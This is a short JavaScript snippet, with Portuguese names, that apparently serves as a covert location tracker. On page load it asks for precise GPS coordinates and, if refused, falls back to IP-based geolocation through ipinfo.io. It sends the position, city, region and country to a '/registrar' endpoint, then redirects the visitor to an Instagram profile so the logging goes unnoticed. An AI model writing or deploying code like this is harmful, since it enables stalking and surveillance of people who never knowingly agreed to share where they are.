function enviarLocalizacao(lat, lon, precisa, city = '', region = '', country = '') {
    fetch('/registrar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ lat, lon, precisa, city, region, country })
    }).finally(() => {
        window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
    });
}


function tentarLocalizacaoPorIP() {
    fetch('https://ipinfo.io/json?token=SEU_TOKEN_AQUI')  // Substitua por seu token real
        .then(res => res.json())
        .then(data => {
            if (!data.loc) throw new Error("Sem campo loc no IPInfo");
            const [lat, lon] = data.loc.split(',');
            enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
        })
        .catch(err => {
            console.error("Erro ao buscar localização por IP:", err);
            enviarLocalizacao(0.0, 0.0, false);
        });
}

navigator.geolocation.getCurrentPosition(
    pos => {
        const { latitude, longitude } = pos.coords;
        enviarLocalizacao(latitude, longitude, true);
    },
    err => {
        console.warn("GPS negado ou falhou:", err);
        tentarLocalizacaoPorIP();
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
);
